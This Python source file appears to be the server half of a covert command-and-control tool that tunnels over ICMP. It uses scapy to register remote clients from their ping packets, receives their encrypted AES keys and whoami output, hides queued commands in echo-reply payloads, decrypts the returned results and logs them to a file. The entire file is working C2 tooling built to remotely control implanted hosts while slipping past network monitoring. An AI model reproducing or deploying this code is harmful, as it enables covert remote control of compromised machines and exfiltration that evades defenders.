from scapy.all import *
import signal, sys, threading
from scapy.layers.inet import ICMP, IP
from client_manager import *
from client import *
from context_manager import *
from helpers import *
from command_handler import *

client_manager = ClientManager()
cmd_handler = CommandHandler(client_manager)

def reply_to_client(packet):
    if packet[ICMP].id == 20:
        response = read_client(packet)

        if response == 33:
            print("sending error")

            ip_adr = packet[IP].src
            ip_layer = packet[IP]
            icmp_layer = packet[ICMP]
            ip_reply = IP(src=ip_layer.dst, dst=ip_layer.src, id=0x13)
            icmp_reply = ICMP(type=0, id=icmp_layer.id, seq=icmp_layer.seq)

            payload = "updateAES"
            reply_packet = ip_reply / icmp_reply / payload

            # Send the reply
            # Set sendp instead of send if using tailscale
            # Set tailscale0 instead of eth0
            send(reply_packet, verbose=0, iface='eth0')
            return

        if ICMP in packet and packet[ICMP].type == 8 and response != "disconnected":  # ICMP Echo Request

            ip_adr = packet[IP].src
            ip_layer = packet[IP]
            icmp_layer = packet[ICMP]
            ip_reply = IP(src=ip_layer.dst, dst=ip_layer.src, id=0x13)
            icmp_reply = ICMP(type=0, id=icmp_layer.id, seq=icmp_layer.seq)

            payload = cmd_handler.read_cmd(ip_adr)
            reply_packet = ip_reply / icmp_reply / payload

            # Send the reply
            # Set sendp instead of send if using tailscale
            # Set tailscale-interface instead of eth0
            send(reply_packet, verbose=0, iface='eth0')


def read_client(packet):
    if packet.haslayer(ICMP):
        if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request

            ## INITIAL CONNECT FROM CLIENT (receive encrypted AES key and nonce, and whoami-command)
            # first packet is 14, last is 80 (for knowing when client is finished sending data)
            if packet[ICMP].seq == 14 or packet[ICMP].seq == 80:

                ## add client if not already in list
                if client_manager.get_clients():
                    found = False
                    # At this point, we could already be on packet nr 2 (if get_clients() returned False)
                    # Also, we could be on packet nr 1 because get_clients() returned True (this means either this is a new client, or a reconnecting client)
                    for client in client_manager.get_clients():
                        if packet[IP].src == client.get_id() and not client.get_client_ready():
                            found = True
                            client.set_encrypted_hex_block(packet[Raw].load.decode())
                            # Last packet in this cycle, decrypt data from client
                            if packet[ICMP].seq == 80:
                                try:
                                    client.initialize()
                                    #client_manager.add_client(client)
                                    #client_manager.print_clients()
                                    return
                                except Exception as error:
                                    print("An error occurred:", error)
                                    print(f"Initialization with IP:{packet[IP].src} failed")
                                    client.setUpdateAES(True)
                                    client.set_server_command("updateAES")
                                    return

                    # First packet: add client to list of clients, then proceed to main loop (clients already registered)
                    if not found:
                        new_client = Client(id=packet[IP].src,
                                            encrypted_hex_block=remove_padded_zeroes(packet[Raw].load.decode()),
                                            client_manager=client_manager)
                        client_manager.add_client(new_client)

                # First packet: add client to list of clients, then proceed to main loop (zero clients registered)
                else:
                    new_client = Client(id=packet[IP].src,
                                        encrypted_hex_block=remove_padded_zeroes(packet[Raw].load.decode()),
                                        client_manager=client_manager)
                    client_manager.add_client(new_client)


            ## CLIENT HAS ALREADY CONNECTED
            else:
                if client_manager.get_clients():

                    client = client_manager.get_client(packet[IP].src)
                    if not isinstance(client, Client):
                        print(f"Client '{packet[IP].src}' not registered")
                        return


                    if client.get_block() and 'Q' not in packet[Raw].load.decode():
                        client.set_encrypted_hex_block(packet[Raw].load.decode())

                    client.update()

                    if packet[ICMP].seq == 13 and not client.get_executed_command() == "cancel":
                        client.set_command_executing(True)

                    if packet[ICMP].seq == 37:
                        if client.get_executed_command() == "cancel":
                            try:
                                client.set_client_response(
                                    decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(),
                                                    remove_padded_zeroes(client.get_encrypted_hex_block())))
                            except Exception as error:
                                print("cancel An error occurred2:", error)
                                print()
                        else:
                            try:
                                # First packets from CLIENT is always "!ping" (this is the check-in packet to see if SERVER has commands waiting).
                                # We skip these packets, otherwise the decryption of the newly generated key and nonce fails.
                                if not (remove_padded_zeroes(client.get_encrypted_hex_block()) == client.get_ping_encrypted()) and (client.getUpdateAES() and client.get_ping_encrypted()):
                                    client.updateAES()
                                else:
                                    client.set_client_response(decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), remove_padded_zeroes(client.get_encrypted_hex_block())))

                                    # Storing the encrypted version of "!ping", so that it can be filtered out when decrypting data from CLIENT (like when updating AES key and nonce)
                                    if not client.get_ping_encrypted() and client.get_client_response() == "!ping":
                                        client.set_ping_encrypted(remove_padded_zeroes(client.get_encrypted_hex_block()))

                                    write_result_to_file(client)
                            except Exception as error:
                                print("37 An error occurred:", error)
                                client.set_server_command("")

                        status = client.handle_response()
                        if status == "disconnected":
                            return "disconnected"
                        else:
                            client.cleanup()